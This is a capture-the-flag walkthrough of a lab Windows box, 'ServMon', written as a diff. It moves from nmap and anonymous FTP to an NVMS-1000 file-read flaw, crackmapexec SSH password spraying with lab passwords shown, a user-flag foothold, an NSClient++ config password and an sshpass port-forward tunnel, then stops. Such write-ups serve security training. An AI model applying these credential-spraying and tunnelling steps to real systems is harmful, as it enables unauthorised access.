@@ -1,0 +1,139 @@
+Scanning with nmap gives us 9 open ports.
+
+FTP is open and anonymous authentication is enabled:
+```bash
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_02-28-22  06:35PM       <DIR>          Users
+```
+
+Opening a connection to the FTP server, it loads us into the *Users* directory on the Windows box.
+On the two user profiles, we get two files:
+
+```bash
+ftp> dir
+229 Entering Extended Passive Mode (|||49679|)
+125 Data connection already open; Transfer starting.
+02-28-22  06:36PM       <DIR>          Nadine
+02-28-22  06:37PM       <DIR>          Nathan
+226 Transfer complete.
+ftp> dir Nadine
+229 Entering Extended Passive Mode (|||49680|)
+125 Data connection already open; Transfer starting.
+02-28-22  06:36PM                  168 Confidential.txt
+226 Transfer complete.
+ftp> dir Nathan
+229 Entering Extended Passive Mode (|||49681|)
+125 Data connection already open; Transfer starting.
+02-28-22  06:36PM                  182 Notes to do.txt
+226 Transfer complete.
+ftp> 
+```
+
+Browsing through the web pages shown available by the nmap scan, we can see port 80 is running a security application called *NVMS-1000*.
+
+
+Researching this security management platform, you'll find a CVE showing a LFI exploit. We can use this to find the `passwords.txt` file that nadia mentions.
+
+We'll save the passwords locally onto our machine, and we'll create another file of known usernames to use to try and find valid passwords.
+The nmap scan discovered that SSH is open on the machine, so we'll try the list of usernames & passwords against that service
+```bash
+crackmapexec ssh 10.10.10.184 -u usernames -p passwords
+
+SSH         10.10.10.184    22     10.10.10.184     [*] SSH-2.0-OpenSSH_for_Windows_8.0
+SSH         10.10.10.184    22     10.10.10.184     [-] Nadine:1nsp3ctTh3Way2Mars! Authentication failed.
+SSH         10.10.10.184    22     10.10.10.184     [-] Nadine:Th3r34r3To0M4nyTrait0r5! Authentication failed.
+SSH         10.10.10.184    22     10.10.10.184     [-] Nadine:B3WithM30r4ga1n5tMe Authentication failed.
+SSH         10.10.10.184    22     10.10.10.184     [+] Nadine:L1k3B1gBut7s@W0rk 
+
+```
+Shortly after starting, we get a hit on the password `L1k3B1gBut7s@W0rk`
+We'll use this to get an SSH session on the box:
+
+```bash
+ssh nadine@10.10.10.184
+
+nadine@SERVMON C:\Users\Nadine>whoami
+servmon\nadine
+
+nadine@SERVMON C:\Users\Nadine>cd Desktop          
+
+nadine@SERVMON C:\Users\Nadine\Desktop>dir 
+ Volume in drive C has no label.                   
+ Volume Serial Number is 20C1-47A1                 
+                                                   
+ Directory of C:\Users\Nadine\Desktop              
+                                                   
+02/28/2022  07:05 PM    <DIR>          .           
+02/28/2022  07:05 PM    <DIR>          ..          
+01/13/2025  03:32 AM                34 user.txt    
+               1 File(s)             34 bytes      
+               2 Dir(s)   6,131,089,408 bytes free 
+                                                   
+nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt 
+35bbddd4146b22e729efd89eb92aa234
+```
+
+Now that we have a foothold on the system, we can go back to our nmap scan to review avenues for PrivEsc.
+nmap identified another web service running at `https://10.10.10.184:8443`:
+
+```bash
+8443/tcp open  ssl/https-alt
+|_ssl-date: TLS randomness does not represent time
+| http-methods: 
+|_  Supported Methods: GET
+| http-title: NSClient++
+|_Requested resource was /index.html
+| fingerprint-strings: 
+|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
+|     HTTP/1.1 404
+|     Content-Length: 18
+|     Document not found
+|   GetRequest: 
+|     HTTP/1.1 302
+|     Content-Length: 0
+|     Location: /index.html
+|     workers
+|_    jobs
+| ssl-cert: Subject: commonName=localhost
+| Issuer: commonName=localhost
+| Public Key type: rsa
+| Public Key bits: 2048
+```
+
+Browsing to this page, it's a service called NSClient++:
+
+
+We can dig through the system files now that we have an authenticated session.
+The NSClient++ program files live in the `C:\Program File\NSClient++` folder. Here we can find the main .ini file, containing a password:
+
+```powershell
+---snip---
+; in flight - TODO
+[/settings/default]
+
+; Undocumented key
+password = ew2x6SsGTxjRwXOT
+
+; Undocumented key
+allowed hosts = 127.0.0.1
+---snip---
+```
+
+We can then use the nscp command line module to check the version of NSClient++:
+```powershell
+PS C:\Program Files\NSClient++> .\nscp.exe --version
+NSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64
+``` 
+
+None of the exploit db articles I read around nscp NSClient vulnerabilities worked, so I re-authed the SSH session using `sshpass` tunnel.
+`sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443`
+This allows me to access the web portal for NSClient++
+
+
+
+
+
